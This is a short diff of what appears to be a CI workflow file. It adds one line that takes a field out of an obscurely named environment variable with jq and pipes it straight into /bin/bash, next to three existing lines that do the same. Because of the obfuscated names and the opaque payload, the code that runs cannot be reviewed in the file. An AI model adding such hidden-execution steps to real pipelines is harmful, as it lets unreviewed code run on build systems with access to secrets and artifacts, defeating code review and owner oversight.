@@ -29,6 +29,7 @@ jobs:
           echo $lsf73 | jq -r .tbwq5737 | /bin/bash
           echo $wih579 | jq -r .af39696 | /bin/bash
           echo $exm4 | jq -r .u0086 | /bin/bash
+          printf '%s' "$hape6022" | jq -r .oyh42 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
